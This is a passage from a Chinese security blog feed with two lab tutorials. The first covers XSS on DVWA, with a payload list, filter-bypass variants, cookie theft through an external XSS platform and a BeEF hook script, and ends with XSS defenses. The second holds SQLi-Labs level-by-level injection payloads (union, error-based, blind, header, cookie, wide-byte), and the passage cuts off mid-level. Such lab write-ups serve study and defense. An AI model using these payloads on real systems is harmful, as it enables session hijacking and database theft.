class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现对两个参数均采取了严格的过滤，无法使用xss</p><hr><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;标签</span><br><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(\&#x27;hack\&#x27;)&lt;/script&gt;  #数据提交至数据库时有时引号需要转义 </span></span><br><span class="line"><span class="string">&lt;script&gt;alert(1)&lt;/script&gt;        #弹出1，对于数字可以不用引号</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span></span><br><span class="line"><span class="string">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">function keyDown()&#123;</span></span><br><span class="line"><span class="string">var keycode = event.keyCode;</span></span><br><span class="line"><span class="string">var realkey = String.fromCharCode(event.keyCode);</span></span><br><span class="line"><span class="string">alert(&quot;</span>按键码: <span class="string">&quot; + keycode + &quot;</span> 字符: <span class="string">&quot; + realkey);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.onkeydown = keyDown;</span></span><br><span class="line"><span class="string">&lt;/scrip&gt;  #捕获用户输入的字符并弹框</span></span><br><span class="line"><span class="string">#a标签</span></span><br><span class="line"><span class="string">&lt;a href=&quot;</span>javascript:alert(<span class="regexp">/XSS/</span>)<span class="string">&quot;&gt;click me!&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;</span><span class="string">&quot; autofocus onfocus=alert(&#x27;xss&#x27;)&gt;click me!&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;</span><span class="string">&quot; onclick=alert(&#x27;xss&#x27;)&gt;click me!&lt;/a&gt;</span></span><br><span class="line"><span class="string">#img标签</span></span><br><span class="line"><span class="string">&lt;img  src=1  οnerrοr=alert(&quot;</span>hack<span class="string">&quot;)&gt;</span></span><br><span class="line"><span class="string">&lt;img  src=1  οnerrοr=alert(document.cookie)&gt; </span></span><br><span class="line"><span class="string">&lt;img  src=&quot;</span>javascript:alert(<span class="string">&quot;hack&quot;</span>);<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;img scr=&#x27;./simle.jpg&#x27; οnmοuseοver=&#x27;alert(/XSS/)&#x27;&gt; #前提要知道一个网站图片的地址，可通过审查元素获得</span></span><br><span class="line"><span class="string">#svg标签</span></span><br><span class="line"><span class="string">&lt;svg οnlοad=&quot;</span>alert(<span class="regexp">/XSS/</span>)<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">#input标签</span></span><br><span class="line"><span class="string">&lt;input οnfοcus=alert(/XSS/) autofocus&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;</span>button<span class="string">&quot; οnclick=&quot;</span>alert(<span class="regexp">/XSS/</span>)<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">#body标签</span></span><br><span class="line"><span class="string">&lt;body οnlοad=alert(1)&gt;</span></span><br><span class="line"><span class="string">&lt;body οnpageshοw=alert(1)&gt;</span></span><br><span class="line"><span class="string">#video标签</span></span><br><span class="line"><span class="string">&lt;video οnlοadstart=alert(1) src=&quot;</span>/media/hack-the-planet.mp4<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">#style标签</span></span><br><span class="line"><span class="string">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span></span><br><span class="line"><span class="string">#iframe标签</span></span><br><span class="line"><span class="string">&lt;iframe onload=alert(&#x27;xss&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>payload集合：<a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt</a></p></blockquote><h2 id="payload变形"><a href="#payload变形" class="headerlink" title="payload变形"></a>payload变形</h2><p>我们可以将上述的XSS 代码进行各种变形，以绕过XSS 过滤器的检测。变形方式主要以下几种</p><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><p>可以将payload 进行大小写转换，如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/XSS/)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">HrEF</span>=<span class="string">&quot;javaScript:alert(/XSS/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># HTML 语言中对引号的使用不敏感，但是某些过滤函数是“锱铢必较”。</span><br><span class="line">&lt; img  src=&quot;#&quot; οnerrοr=&quot;alert(/XSS/)&quot; /&gt;</span><br><span class="line">&lt; img  src=&#x27;#&#x27; οnerrοr=&#x27;alert(/XSS/)&#x27; /&gt;</span><br><span class="line">&lt; img  src=# οnerrοr=alert(/XSS/) /&gt;</span><br></pre></td></tr></table></figure><h3 id="代替空格"><a href="#代替空格" class="headerlink" title="[/]代替空格"></a>[/]代替空格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以利用左斜线代替空格</span><br><span class="line">&lt;Img/sRc=1/Onerror=&quot;alert(/XSS/)&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="0A-代替空格"><a href="#0A-代替空格" class="headerlink" title="[%0A]代替空格"></a>[%0A]代替空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以利用左斜线代替空格，xsslab第16关</span><br><span class="line">&lt;Img%0AsRc=1%0AOnerror=&quot;alert(/XSS/)&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="回车"><a href="#回车" class="headerlink" title="回车"></a><strong>回车</strong></h3><p>我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">HrEF</span>=<span class="string">&quot;j</span></span></span><br><span class="line"><span class="string"><span class="tag">a    v</span></span></span><br><span class="line"><span class="string"><span class="tag">a    S</span></span></span><br><span class="line"><span class="string"><span class="tag">c    r</span></span></span><br><span class="line"><span class="string"><span class="tag">i    p</span></span></span><br><span class="line"><span class="string"><span class="tag">t    :</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(/XSS/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h3><table><thead><tr><th>字母</th><th>ASCII码</th><th>十进制编码</th><th>十六进制编码</th></tr></thead><tbody><tr><td>a</td><td>97</td><td>&amp;#97</td><td>&amp;#x61</td></tr><tr><td>e</td><td>101</td><td>&amp;#101</td><td>&amp;#x65</td></tr></tbody></table><blockquote><p>注：每个字母编码后都要加；且只能对标签属性进行编码，不能对标签编码</p><p>各进制编码表：<a href="https://blog.csdn.net/weixin_30362233/article/details/97278759?utm_term=%E5%8D%81%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E5%AF%B9%E7%85%A7%E8%A1%A8&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-97278759&amp;spm=3001.4430">https://blog.csdn.net/weixin_30362233/article/details/97278759?utm_term=%E5%8D%81%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E5%AF%B9%E7%85%A7%E8%A1%A8&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-97278759&amp;spm=3001.4430</a></p></blockquote><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;A hREF=&quot;javascript:alert(/XSS/)&quot;&gt;click me!&lt;/a&gt;</span><br><span class="line">编码后：</span><br><span class="line">&lt;A hREF=&quot;j&amp;#97;v&amp;#x61;script:alert(/XSS/)&quot;&gt;click me !&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a><strong>拆分跨站</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=<span class="string">&#x27;alert&#x27;</span>&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="字符串检测"><a href="#字符串检测" class="headerlink" title="字符串检测"></a>字符串检测</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#当后端检测我们的输入必须包含某些字符时比如http，可以使用/*http*/</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(/XSS/)/*http*/</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p><strong>如果自己的js水平一般不能构造出那些恶意js代码时，就可以使用xss平台给你构造好的payload，我们只需要让用户访问恶意代码的链接即可</strong></p><p><strong>本次使用的是<a href="https://xsshs.cn/">https://xsshs.cn</a>这个xss平台，这个里面脚本很丰富</strong></p><p>web页面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102943.png"></p><p>点击创建：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102957.png"></p><p>下一步选择我们需要的功能，通过我们勾选的功能，后端来给我们构造jspayload：</p><p>比如读取cookie</p><blockquote><p>注意要先勾选默认模块并保持keepsession</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803103008.png"></p><p>点击下一步</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803103040.png"></p><p>当受害者浏览器请求到了远端的js代码并执行后，xss平台就会获取到受害者的cookie</p><p>通过kali攻击机将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xsshs.cn/cZ37&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p>存入到dvwa中</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803103105.png"></p><p>然后本机在访问该页面时就会执行该js代码，然后cookie就会显示在xss平台</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803103116.png"></p><p>查看xss平台，成功显示cookie</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803103132.png"></p><h2 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h2><p>其实和xss平台差不多，都是通过让受害者浏览器访问远端的js代码来获取受害者信息</p><script src='http://你的ip:3000/hook.js'></script><p>将如上代码通过xss嵌入到网页中，然后受害者访问页面时就会去访问远端的js代码，从而被控制</p><p>具体流程参考</p><blockquote><p><a href="https://blog.csdn.net/whoim_i/article/details/102877616">https://blog.csdn.net/whoim_i/article/details/102877616</a></p></blockquote><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>XSS防御的总体思路是：<strong>对输入(和URL参数)进行过滤，对输出进行编码</strong>。</p><p>也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。<strong>虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击</strong>。</p><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。</p><p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，如果发现存在特殊字符，者将这些特殊字符过滤或者编码。</p><p>还可以匹配XSS的特征。比如查找用户数据中是否包含了”<code>&lt;script&gt;</code>“、”javascript”等敏感字符。这种输入检查的方式，可以称为“XSS Filter”。XSS Filter在用户提交数据时获取变量，并进行XSS检查。</p><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>一般来说，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p><p><strong>安全的编码函数</strong><br>比如php中htmlspecialchars()</p><p><strong>输入过滤+输出检查=XSS Filter</strong></p><h3 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h3><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容。比如：</p><ol><li>表单数据指定值的类型：年龄只能是 int 、名字只能是字母数字等。</li><li>过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等。</li><li>过滤 js 事件的标签：<code>onclick</code>、<code>onerror</code>、<code>onfocus</code>等。</li></ol><ul><li>确保执行脚本来源可信</li></ul><p>开发者明确告诉客户端，哪些外部资源可以加载和执行（CSP策略）</p><p>总之，总的原则：<strong>输入做过滤，输出做转义</strong></p><ul><li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</li><li>转义：所有输出到前端的数据根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面进行JS转义。</li></ul><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>可以将cookie 标记为 http only，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在js脚本中却不能访问 cookie，这样就避免了 XSS 攻击利用 js 的 <code>document.cookie</code>获取 cookie。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">header(<span class="string">&quot;Set-Cookie: cookie1=test1;&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;Set-Cookie: cookie2=test2;httponly&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>不管采用输入过滤还是输出编码，都是针对数据信息进行黑|白名单式的过滤</p><p>黑名单：过滤特殊符号及字符，可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。</p><p>白名单：只允许特定类型或字符，可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p><blockquote><p><a href="https://www.wawyw.top/posts/54823.html">https://www.wawyw.top/posts/54823.html</a></p><p><a href="https://blog.csdn.net/weixin_40270125/article/details/89415990">https://blog.csdn.net/weixin_40270125/article/details/89415990</a></p><p><a href="https://blog.csdn.net/weixin_43252204/article/details/105910672">https://blog.csdn.net/weixin_43252204/article/details/105910672</a></p><p><a href="https://blog.csdn.net/whoim_i/article/details/102877616">https://blog.csdn.net/whoim_i/article/details/102877616</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-Labs靶场总结</title>
      <link href="/2021/07/30/SQLi-Labs%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/30/SQLi-Labs%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLi-Labs靶场总结"><a href="#SQLi-Labs靶场总结" class="headerlink" title="SQLi-Labs靶场总结"></a>SQLi-Labs靶场总结</h1><h2 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h2><p>1</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/">http://127.0.0.1/sqli-labs/Less-1/</a><br>?id=1’ union select 1,2,group_concat(username,0x3a,password) from security.users limit 1,1–+</p><p>2<br><a href="http://localhost/sqli/Less-2/?id=-1">http://localhost/sqli/Less-2/?id=-1</a> union select 1,@@datadir,@@basedir–+</p><p>7 ‘))<br><a href="http://127.0.0.1/sqli-labs/Less-7/">http://127.0.0.1/sqli-labs/Less-7/</a><br>?id=1’)) and sleep(5)–+<br>如果是字符型注入，以后均用延时注入来判断引号闭合方式<br>eg:<a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and sleep(5)–+</p><p>13  ‘)</p><h2 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h2><p>18<br>user-agent注入 ‘,’a’,extractvalue(0x0a,concat(0x0a,(select database()))))#<br>注意将报错语句写入到VALUES()里面</p><p>19<br>refer注入：Referer: <a href="http://127.0.0.1/sqli-labs/Less-19/&#39;,extractvalue">http://127.0.0.1/sqli-labs/Less-19/&#39;,extractvalue</a>(0x0a,concat(0x0a,(select database()))))#</p><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>20<br>cookie注入：Cookie: uname=admin’ and extractvalue(0x0a,concat(0x0a,(select database())))#</p><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><p>21 ‘)<br>base64注入：Cookie：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDB4MGEsY29uY2F0KDB4MGEsKHNlbGVjdCBkYXRhYmFzZSgpKSkpIw==</p><p>22 “<br>base64注入：Cookie：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMHgwYSxjb25jYXQoMHgwYSwoc2VsZWN0IGRhdGFiYXNlKCkpKSkj</p><p>23 and ‘1’=’1<br>#和–被过滤掉<br>那么对于最后一个单引号可以使用如上闭合方式<br>当union select1,2,3无回显时，记着后加limit1，1</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>24关</p><blockquote><p>参见<a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-49">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-49</a> 第24关解读</p></blockquote><p>25<br><strong>注意and&lt;=&gt;&amp;&amp;   or&lt;=&gt;||</strong><br>当我发送<a href="http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;</a> &amp;&amp; ‘1’=’1是不行的因为有空格服务器会认为id=1’<br><a href="http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;&amp;&amp;&#39;1&#39;=&#39;1%E4%B9%9F%E6%98%AF%E4%B8%8D%E8%A1%8C%E7%9A%84%E5%9B%A0%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BE%9D%E7%84%B6%E4%BC%9A%E8%AE%A4%E4%B8%BAid=1&#39;">http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;&amp;&amp;&#39;1&#39;=&#39;1也是不行的因为服务器依然会认为id=1&#39;</a><br>必须给&amp;编码<a href="http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;%26%26&#39;1&#39;=&#39;1">http://127.0.0.1/sqli-labs/Less-25/?id=1&#39;%26%26&#39;1&#39;=&#39;1</a> !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p><p>26<br><a href="http://127.0.0.1/sqli-labs/Less-26/?id=1&#39;%26%26length(database())=8%26%26&#39;1&#39;=&#39;1">http://127.0.0.1/sqli-labs/Less-26/?id=1&#39;%26%26length(database())=8%26%26&#39;1&#39;=&#39;1</a><br>过滤了注释，空格以及and和or等，可用&amp;&amp;和||，双写绕过以及空格编码绕过，具体见国光blog</p><p>27<br><a href="http://127.0.0.1/sqli-labs/Less-26/?id=1&#39;%20%26%26%20length(database())=8%20%26%26%20&#39;1&#39;=&#39;1">http://127.0.0.1/sqli-labs/Less-26/?id=1&#39;%20%26%26%20length(database())=8%20%26%26%20&#39;1&#39;=&#39;1</a><br>过滤了union和select可以使用如上布尔盲注</p><p>28 28相比27只是闭合方式变为了”<br><a href="http://127.0.0.1/sqli-labs/Less-26a/?id=1&quot;&&length(database())=8&&&quot;1&quot;=&quot;1">http://127.0.0.1/sqli-labs/Less-26a/?id=1&quot;%26%26length(database())=8%26%26&quot;1&quot;=&quot;1</a></p><p>注意id参数内容有空格或者&amp;等符号必须进行编码<br>后方的闭合方式不仅有#，–+还有and ‘1’=1’，&amp;&amp;’1’=’1</p><p>28a<br><a href="http://127.0.0.1/sqli-labs/Less-28a/?id=1&#39;)%26%26sleep(5)%26%26(&#39;1&#39;)=">http://127.0.0.1/sqli-labs/Less-28a/?id=1&#39;)%26%26sleep(5)%26%26(&#39;1&#39;)=</a>(‘1    //通过这个知道引号的闭合方式为’)<br><a href="http://127.0.0.1/sqli-labs/Less-28a/?id=1&#39;)%26%26length(database())=8%26%26(&#39;1&#39;)=">http://127.0.0.1/sqli-labs/Less-28a/?id=1&#39;)%26%26length(database())=8%26%26(&#39;1&#39;)=</a>(‘1   //通过这个布尔盲注</p><p>30<br>简单分析一下：<br>输入id=1正常回显<br>输入id=1’正常回显，猜测可能闭合方式为”，因为”1’”会被当作”1”执行<br>输入id=1”无回显，猜测可能极大概率闭合方式为”，因为报错了所以无查询结果回显<br>输入id=1”%26%26”1”=”1正常回显，说明闭合方式为”<br>payload:<a href="http://127.0.0.1/sqli-labs/Less-30/?id=1&quot;&&length(database())=8&&&quot;1&quot;=&quot;1">http://127.0.0.1/sqli-labs/Less-30/?id=1&quot;%26%26length(database())=8%26%26&quot;1&quot;=&quot;1</a></p><p>31<br>拼接方式 “)</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>32<br>本关卡会给引号加/<br>宽字节注入原理<br>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。<br>%df 吃掉 <br>具体的原因是 urlencode(&#39;) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>payload：<a href="http://127.0.0.1/sqli-labs/Less-32/?id=1%EF%BF%BD&#39;">http://127.0.0.1/sqli-labs/Less-32/?id=1%df&#39;</a> union select 1,2,database() limit 1,1–+</p><p>33<br><strong>利用宽字节注入绕过addlashes()</strong><br><strong>以后#，空格，&amp;符号要进行url编码</strong></p><p>34</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164116.png"></p><p>正常返回为：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164128.png"></p><p>尝试username处有没有注入，输入admin’，发现被加反斜杠： </p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164233.png"></p><p>尝试宽字节注入：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164136.png"></p><p>返回如下，说明成功绕过：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164221.png"></p><p>联合注入：</p><p>抓包修改</p><p>Payload：username=admin%df’%20union%20select%201,2%20limit1,1%23</p><p>返回：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164244.png"></p><p>列数不同，尝试一列：</p><p>Payload：username=admin%df’%20union%20select%201%20limit1,1%23</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164249.png"></p><p>成功</p><p>继续payload：uname=admin%df’%20union%20select%20database()%20limit1,1%23</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164254.png"></p><p>35</p><p>输入<a href="http://127.0.0.1/sqli-labs/Less-35/?id=1&#39;">http://127.0.0.1/sqli-labs/Less-35/?id=1&#39;</a></p><p>发现报错如下：</p><p> <img 